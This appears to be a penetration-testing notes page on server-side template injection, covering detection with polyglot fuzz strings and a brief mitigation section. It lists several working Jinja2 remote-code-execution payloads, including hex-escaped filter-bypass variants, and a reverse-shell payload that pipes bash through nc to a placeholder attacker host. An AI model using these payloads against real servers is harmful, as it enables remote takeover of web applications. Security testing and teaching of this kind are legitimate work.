# SSTI

Server-side template injection (SSTI) happens when user input is placed unsafely into server templates, allowing code execution on the server. This can occur in web applications that use technologies like Jinja2, Twig, or FreeMaker to generate dynamic HTML. Systems that might be at risk include wiki-pages, reviews, marketing apps, and CMS systems. Some template engines use methods like sandboxes or whitelisting to guard against SSTI.



## Detect SSTI vulnerability

To identify SSTI vulnerabilities, use a **Polyglot payload** composed of special characters commonly used in template expressions to fuzz the template.

```none
${{<%[%'"}}%\.
${{<%[%'\"}}%\\. 
```

If there's a vulnerability, the server might return an error message or raise an exception. This can help pinpoint the vulnerability and the template engine being used. Here's a basic checklist:

* Find where template injection occurs
* Identify the template engine and confirm the vulnerability
* Refer to the manuals for that specific template engine
* Exploit the vulnerability



## SSIT to RCE

### Jinja2

```bash
# payloads to RCE
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']()}}
{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']()}}
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

{% code title="RevShell" overflow="wrap" %}
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATT_IP ATT_PORT >/tmp/f').read() }}
```
{% endcode %}

{% embed url="https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/" %}



## Mitigation

To effectively remediate SSTI vulnerabilities, the approach depends on the specific template engine in use. Here are two common strategies:

* **Sanitization**: Ensure user inputs are sanitized before being processed by templates to mitigate the risk of malicious input.
* **Sandboxing**: If risky characters are necessary for business purposes, implementing a sandbox within a secure environment is advisable.

\
